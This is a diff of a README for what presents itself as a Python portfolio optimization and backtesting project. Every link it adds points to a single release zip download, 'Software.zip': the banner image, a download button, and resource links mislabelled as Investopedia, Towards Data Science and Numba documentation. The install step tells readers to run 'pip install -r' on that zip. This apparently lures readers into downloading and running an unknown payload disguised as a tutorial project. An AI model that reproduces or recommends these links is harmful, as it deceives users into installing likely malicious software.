@@ -1,6 +1,6 @@
 # Portfolio Optimization and Backtesting Using Python: A Pragmatic Approach
 
-![Portfolio Optimization](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)
+![Portfolio Optimization](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)
 
 ## Introduction
 
@@ -29,7 +29,7 @@ The main goal of this project is to demonstrate how to effectively optimize and 
 To get started with this project, please follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the required Python libraries by running `pip install -r https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip`.
+2. Install the required Python libraries by running `pip install -r https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip`.
 3. Explore the Jupyter Notebooks provided in the `notebooks` directory to understand the portfolio optimization and backtesting process.
 4. Experiment with different parameters and strategies to customize the portfolio optimization based on your requirements.
 5. Run the provided scripts and notebooks to see the optimization results and backtesting performance.
@@ -42,9 +42,9 @@ If you are new to portfolio optimization or backtesting using Python, don't worr
 
 For more information and detailed explanations, please refer to the following resources:
 
-- [Modern Portfolio Theory - Investopedia](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)
-- [Monte Carlo Simulation - Towards Data Science](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)
-- [Numba JIT Compiler - Numba Documentation](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)
+- [Modern Portfolio Theory - Investopedia](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)
+- [Monte Carlo Simulation - Towards Data Science](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)
+- [Numba JIT Compiler - Numba Documentation](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)
 
 ### Project Structure
 
@@ -82,7 +82,7 @@ This repository is licensed under the MIT License. For more details, please refe
 
 ---
 
-[![Download Source Code](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v1.0/Installer.zip)
+[![Download Source Code](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)](https://github.com/cartelcreationyt/Portfolio-Optimization-and-Backtesting-Using-Python-A-Pragmatic-Approach/releases/download/v2.0/Software.zip)
 
 If you encounter any issues with the download link, please check the "Releases" section for alternative options.
 
